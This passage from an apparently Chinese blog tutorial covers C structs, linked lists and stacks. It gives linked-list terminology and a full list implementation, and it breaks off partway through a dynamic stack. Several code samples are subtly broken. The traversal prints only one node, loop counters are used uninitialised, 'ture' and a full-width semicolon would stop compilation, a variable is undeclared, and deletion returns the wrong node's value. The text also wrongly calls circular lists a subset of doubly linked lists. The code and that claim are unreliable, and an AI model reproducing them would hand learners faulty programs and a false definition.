class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> sid;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="type">char</span> sex;</span><br><span class="line">&#125;ST, * PST;<span class="comment">//PST等价于struct Student *</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ST st;</span><br><span class="line">    PST ps = &amp;st;</span><br><span class="line">    ps-&gt;sid = <span class="number">199</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ps-&gt;sid);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-2-链表"><a href="#2-2-2-链表" class="headerlink" title="2.2.2 链表"></a>2.2.2 链表</h3><p><strong>链表的定义</strong>：n个节点离散分配，彼此通过指针相连，每个节点只有一个前驱节点同时每个节点只有一个后续节点，首节点没有前驱节点，尾节点没有后续节点。</p><p>专业术语：</p><ul><li>首节点：存放第一个有效数据的节点</li><li>尾节点：存放最后一个有效数据的节点</li><li>头节点：位于首节点之前的一个节点，头结点并不存放有效的数据，加头结点的目的主要是为了方便对链表的操作</li><li>头指针：指向头结点的指针变量</li><li>尾指针：指向尾节点的指针变量</li></ul><img src="/posts/79666db/2.2.2.jpg" class="" title="专业术语"><p>确定一个链表需要几个参数：只需要一个头指针参数，因为我们通过头指针可以推算出链表的其他所有信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">pNext</span>;</span><span class="comment">//指向下一个与自己一模一样的数据类型</span></span><br><span class="line">&#125;NODE, * PNODE;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>链表的分类</strong>：</p><ul><li>单链表：每一个节点只有一个指针域</li><li>双链表：每一个节点有两个指针域</li><li>循环链表：能通过任何一个节点找到其他所有的节点</li><li>非循环链表：不能通过任何一个节点找到其他所有的节点</li></ul><p>循环链表属于双链表的一种特殊形式，即循环链表是双链表的一个子集。</p><h4 id="2-2-2-1-链表的插入"><a href="#2-2-2-1-链表的插入" class="headerlink" title="2.2.2.1 链表的插入"></a>2.2.2.1 链表的插入</h4><ol><li>r = p-&gt;pNext; p-&gt;pNext = q; q-&gt;pNext = r;</li><li>q-&gt;pNext = p-&gt;pNext; p-&gt;pNext = q;</li></ol><h4 id="2-2-2-2-链表的删除"><a href="#2-2-2-2-链表的删除" class="headerlink" title="2.2.2.2 链表的删除"></a>2.2.2.2 链表的删除</h4><ol><li>r = p-&gt;pNext; p-&gt;pNext = p-&gt;pNext-&gt;pNext; free(r);</li></ol><h3 id="2-2-3-链表的实现"><a href="#2-2-3-链表的实现" class="headerlink" title="2.2.3 链表的实现"></a>2.2.3 链表的实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> data;<span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">pNext</span>;</span><span class="comment">//指针域</span></span><br><span class="line">&#125;NODE,*PNODE；<span class="comment">//NODE相当于struct Node，*PNODE相当于struct Node *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建链表</span></span><br><span class="line">PNODE <span class="title function_">create_list</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="comment">//遍历链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">traverse_list</span><span class="params">(PNODE pHead)</span>;</span><br><span class="line"><span class="comment">//判断是否为空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_empty</span><span class="params">(PNODE pHead)</span>;</span><br><span class="line"><span class="comment">//返回链表长度</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">length_list</span><span class="params">(PNODE pHead)</span>;</span><br><span class="line"><span class="comment">//在指定节点处插入某个元素</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">insert_list</span><span class="params">(PNODE,<span class="type">int</span>,<span class="type">int</span>)</span>;</span><br><span class="line"><span class="comment">//删除指定位置的元素</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">delete_list</span><span class="params">(PNODE,<span class="type">int</span>,<span class="type">int</span> *)</span>;</span><br><span class="line"><span class="comment">//对链表排序</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sort_list</span><span class="params">(PNODE pHead)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNODE pHead = <span class="literal">NULL</span>;<span class="comment">//定义头节点</span></span><br><span class="line">    pHead = create_list();</span><br><span class="line">    traverse_list(pHead);</span><br><span class="line">    <span class="keyword">if</span>(is_empty(pHead))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链表为空！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链表非空！\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> len = length_list(pHead);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;链表的长度是%d\n&quot;</span>, len);</span><br><span class="line">    </span><br><span class="line">    sort_list(pHead);</span><br><span class="line">    traverse_list(pHead);</span><br><span class="line">    </span><br><span class="line">    insert_list(pHead, <span class="number">4</span>, <span class="number">33</span>);</span><br><span class="line">    traverse_list(pHead);</span><br><span class="line">    </span><br><span class="line">    delete_list(pHead, <span class="number">4</span>, &amp;val);</span><br><span class="line">    traverse_list(pHead);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PNODE <span class="title function_">create_list</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len;<span class="comment">//链表成员个数，由用户输入</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> val;<span class="comment">//链表成员值，由用户输入</span></span><br><span class="line"></span><br><span class="line">    PNODE pHead = (PNODE)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(NODE));</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pHead)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分配内存失败，程序结束&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入链表长度,len=&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;len);</span><br><span class="line"></span><br><span class="line">    PNODE pTail = pHead;</span><br><span class="line">    pTail-&gt;pNext = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PNODE pNew = (PNODE)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(NODE));</span><br><span class="line">      <span class="keyword">if</span> (<span class="literal">NULL</span> == pNew)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;分配内存失败，程序结束&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;请输入要插入链表的值,val=&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;val);</span><br><span class="line"></span><br><span class="line">      pNew-&gt;data = val;</span><br><span class="line">      pTail-&gt;pNext = pNew;</span><br><span class="line">      pNew-&gt;pNext = <span class="literal">NULL</span>;</span><br><span class="line">      pTail = pNew;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pHead;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">traverse_list</span><span class="params">(PNODE pHead)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNODE p = pHead-&gt;pNext;<span class="comment">//p指向首节点</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;pNext;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_empty</span><span class="params">(PNODE pHead)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pHead-&gt;pNext)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">length_list</span><span class="params">(PNODE pHead)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">PNODE p = pHead-&gt;pNext;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">NULL</span> != p)</span><br><span class="line">&#123;</span><br><span class="line">        ++len;</span><br><span class="line">        p = p-&gt;pNext;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">insert_list</span><span class="params">(PNODE pHead, <span class="type">int</span> pos, <span class="type">int</span> val)</span></span><br><span class="line">&#123;<span class="comment">//这里算上了头结点，所以在第2个位置插入元素，也就是把下标为2及以后的元素往后移，将新节点放到下标为2的位置</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">PNODE p = pHead;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//循环到p指向pos-1的位置</span></span><br><span class="line"> <span class="keyword">while</span>( <span class="literal">NULL</span> != p &amp;&amp; i &lt; pos - <span class="number">1</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   p = p-&gt;pNext;</span><br><span class="line">     ++i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == p || i &gt; pos <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入的数申请内存</span></span><br><span class="line">PNODE pNew = (PNODE)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(NODE));</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pNew)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分配内存失败，程序终止！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">pNew-&gt;data = val;</span><br><span class="line">PNODE q = p-&gt;pNext;</span><br><span class="line">p-&gt;pNext = pNew;</span><br><span class="line">pNew-&gt;pNext = q;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ture;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">delete_list</span><span class="params">(PNODE pHead, <span class="type">int</span> pos, <span class="type">int</span> *pVal)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">PNODE p = pHead;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//循环到p指向pos-1的位置</span></span><br><span class="line"><span class="keyword">while</span>( <span class="literal">NULL</span> != p-&gt;pNext &amp;&amp; i &lt; pos - <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">p = p-&gt;pNext;</span><br><span class="line">     ++i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == p-&gt;pNext || i &gt; pos - <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">PNODE q = p-&gt;pNext;</span><br><span class="line">    *pVal = p-&gt;data;</span><br><span class="line">    p-&gt;pNext = q-&gt;pNext;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    q=<span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//选择排序</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sort_list</span><span class="params">(PNODE pHead)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j,t;</span><br><span class="line">    PNODE p,q;</span><br><span class="line">    <span class="type">int</span> len = length_list(pHead);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>,p=pHead-&gt;pNext; i&lt;len<span class="number">-1</span>; i++,p=p-&gt;pNext)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">for</span>(j=i+<span class="number">1</span>,q=p-&gt;pNext; j&lt;len; j++,q=q-&gt;pNext)</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">if</span>(p-&gt;data &gt; q-&gt;data)</span><br><span class="line">             &#123;</span><br><span class="line">                 t = p-&gt;data;</span><br><span class="line">                 p-&gt;data = q-&gt;data;</span><br><span class="line">                 q-&gt;data = t;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-3-线性结构的两种常见应用之一-栈"><a href="#2-3-线性结构的两种常见应用之一-栈" class="headerlink" title="2.3. 线性结构的两种常见应用之一 栈"></a>2.3. 线性结构的两种常见应用之一 栈</h2><ul><li>定义：一种可以实现“先进后出”的存储结构</li><li>分类：静态栈；动态栈(链式栈)</li><li>算法：压栈；出栈</li><li>应用：函数调用；中断；表达式求值；内存分配；缓冲处理；迷宫</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="type">double</span> *q = (<span class="type">double</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">double</span>) * <span class="number">50</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> *p = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">50</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">k,m,q,i,p都分配在栈中，而malloc分配的空间是在堆中</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">动态栈利用头插法链表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">pNext</span>;</span></span><br><span class="line">&#125;NODE, * PNODE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PNODE pTop;<span class="comment">//pTop是尾指针，指向尾结点</span></span><br><span class="line">    PNODE pBottom;<span class="comment">//pBottom是头指针，指向头结点</span></span><br><span class="line">&#125;STACK, * PSTACK; <span class="comment">//PSTACK 等价于 struct STACK *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数声明</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(PSTACK)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(PSTACK, <span class="type">int</span>)</span>; <span class="comment">//压栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">traverse</span><span class="params">(PSTACK)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">pop</span><span class="params">(PSTACK, <span class="type">int</span> *)</span>; <span class="comment">//出栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear</span><span class="params">(PSTACK)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    STACK S; <span class="comment">//STACK 等价于 struct Stack</span></span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line"></span><br><span class="line">    init(&amp;S); <span class="comment">//目的是造出一个空栈</span></span><br><span class="line">    push(&amp;S, <span class="number">1</span>); <span class="comment">//压栈</span></span><br><span class="line">    push(&amp;S, <span class="number">2</span>);</span><br><span class="line">    push(&amp;S, <span class="number">3</span>);</span><br><span class="line">    push(&amp;S, <span class="number">4</span>);</span><br><span class="line">    push(&amp;S, <span class="number">5</span>);</span><br><span class="line">    push(&amp;S, <span class="number">6</span>);</span><br><span class="line">    traverse(&amp;S);<span class="comment">//遍历输出</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( pop(&amp;S, &amp;val) )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;出栈成功，出栈的元素是%d\n&quot;</span>,val);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;出栈失败！\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    clear(&amp;S);</span><br><span class="line">    traverse(&amp;S);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(PSTACK pS)</span></span><br><span class="line">&#123;</span><br><span class="line">    pS-&gt;pTop = (PNODE)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(NODE));</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span> == pS-&gt;pTop)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;动态内存分配失败！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="comment">//创建一个空栈</span></span><br><span class="line">        